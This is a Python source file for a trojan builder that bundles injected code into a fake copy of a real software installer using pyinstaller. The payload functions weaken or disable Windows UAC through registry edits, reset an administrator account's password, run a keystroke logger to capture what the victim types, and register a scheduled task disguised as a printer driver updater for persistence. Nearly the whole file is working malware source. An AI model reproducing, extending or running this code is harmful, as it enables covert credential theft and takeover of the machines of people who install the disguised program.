from os import system, getlogin, remove, path
from subprocess import run
from keyboard import record
from time import sleep
import inspect
import poisonRecipe

scheduler = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"

#Create .exe identical to installer, but with fake elevation then execution stuff
def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog): # TODO Forgot elevation request in poison
    poison = open("poison.py", 'w') #The file that will be bundled with fake installer
    recipe = open("poisonRecipe.py", 'r') #Base file for imports

    for line in recipe:
        poison.write(line)

    include = ""
    main = ""

    #Module importing
    if(UACdowngrade == 1):
        include += inspect.getsource(DowngradeUAC)
        main += "   DowngradeUAC()\n"
        include += "\n"
    if(UACdisable == 1):
        include += inspect.getsource(DisableUAC)
        main += "   DisableUAC()\n"
        include += "\n"
    if(Adminpwn == 1):
        include += inspect.getsource(PwnAdmin)
        main += "   PwnAdmin()\n"
        include += "\n"
    if(Keylog == 1):
        include += inspect.getsource(Log)
        main += "   Log()\n"
        include += "\n"
    
    poison.write(include)

    #__main__
    poison.write("if __name__ == \"__main__\":\n   Elevate()\n")
    poison.write(main) #Probably some loop I can use for this

    #Create poisoned installer
    system("pyinstaller -F --name Poison -i " + installer + " " + path.realpath(poison.name))
    

def PwnAdmin():
    system("net user \"gv admin\" 123456")

def DowngradeUAC():
    #Stop UAC opening on secure desktop, allowing for software keylogger
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v PromptOnSecureDesktop /t REG_DWORD /d 0")

def DisableUAC():
    #Straight disable UAC
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v EnableLUA /t REG_DWORD /d 0")

#Applications infact do not get left alone by UAC if launched as admin. Screw you dude on stack overflow thread from 7 years ago, its you and not 7 years
def Log():
    #Start a keylogger
    output = open(('C:/Users/' + str(getlogin()) + '/Desktop/log.txt'), 'w') # TODO getlogin might retun the user who elevated it
    r = record(until='`')
    r = str(r)
    r = r.replace("KeyboardEvent(", '')
    r = r.replace(',', '')
    r = r.replace("down)", ',')
    r = r.replace("up)", '\'')
    output.write(r)

def OpenConsole():
    #Open a console as the authorizing account
    sleep(900)# 15 minutes
    system("cmd runas")

#Drivers?

if __name__ == "__main__":
    PoisonBottle("C:/Users/lhill23/Documents/VEXcodeV5-20220228.exe", 1, 1, 1, 1)